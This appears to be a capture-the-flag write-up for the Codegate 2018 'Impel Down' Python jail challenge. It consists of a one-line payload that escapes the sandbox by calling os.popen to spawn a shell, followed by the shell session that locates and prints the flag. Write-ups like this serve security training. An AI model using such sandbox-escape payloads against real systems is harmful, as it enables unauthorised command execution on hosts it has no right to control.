

# [MISC] Codegate 2018 Quals - Impel Down

## Description

Just Source File

## Analysis

exploit only



```
                    __
          PyJail   /__\
       ____________|  |
       |_|_|_|_|_|_|  |
       |_|_|_|_|_|_|__|
      A@\|_|_|_|_|_|/@@Aa
   aaA@@@@@@@@@@@@@@@@@@@aaaA
  A@@@@@@@@@@@@@@@@@@@@@@@@@@A
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
[!] Rule
1. After 3 day, the Light will be Turned Off then you Cannot see anything.
2. Cannot Use Some Special Characters in PyJail.
3. For 10 days, You can enter 38 characters per day.

Can You Escape from Here ??

 Name : shpik
[day-1]
################## Work List ##################
  coworker        : Find Coworker For Escape
  tool            : Find Any Tool
  dig             : Go Deep~
  bomb            : make boooooooomb!!!
###############################################
dig(sys.modules['os'].popen('sh>&2'))

ls
Impel_Down.py
run.sh
ls -al
total 16
drwxr-xr-x 2 root impel_down 4096 Feb  2 08:04 .
drwxr-xr-x 3 root root       4096 Feb  2 08:04 ..
-r-xr-x--- 1 root impel_down 3807 Feb  2 08:03 Impel_Down.py
-rwxr-xr-x 1 root root        132 Feb  2 08:04 run.sh
cd /
ls -al
total 84
drwxr-xr-x  21 root root       4096 Feb  3 03:15 .
drwxr-xr-x  21 root root       4096 Feb  3 03:15 ..
-rwxr-xr-x   1 root root          0 Feb  3 03:15 .dockerenv
-rwx--x---   1 root impel_down 8624 Feb  2 08:04 FLAG_FLAG_FLAG_LOLOLOLOLOLOL
drwxr-xr-x   2 root root       4096 Nov 14  2016 bin
drwxr-xr-x   2 root root       4096 Apr 12  2016 boot
drwxr-xr-x   5 root root        340 Feb  3 03:15 dev
drwxr-xr-x  44 root root       4096 Feb  3 03:15 etc
drwxr-xr-x   3 root root       4096 Feb  2 08:04 home
drwxr-xr-x   8 root root       4096 Feb  2 08:03 lib
drwxr-xr-x   2 root root       4096 Feb  2 08:03 lib64
drwxr-xr-x   2 root root       4096 Nov 14  2016 media
drwxr-xr-x   2 root root       4096 Nov 14  2016 mnt
drwxr-xr-x   2 root root       4096 Nov 14  2016 opt
dr-xr-xr-x 303 root root          0 Feb  3 03:15 proc
drwx------   2 root root       4096 Nov 14  2016 root
drwxr-xr-x   5 root root       4096 Nov 16  2016 run
drwxr-xr-x   2 root root       4096 Nov 16  2016 sbin
drwxr-xr-x   2 root root       4096 Nov 14  2016 srv
dr-xr-xr-x  13 root root          0 Feb  3 05:50 sys
drwxrwxrwt   2 root root       4096 Feb  4 10:04 tmp
drwxr-xr-x  10 root root       4096 Feb  2 08:03 usr
drwxr-xr-x  11 root root       4096 Feb  2 08:04 var
/F*
  G00000000d !! :)
  I think you are familiar with Python !
  FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}
```



 **FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}**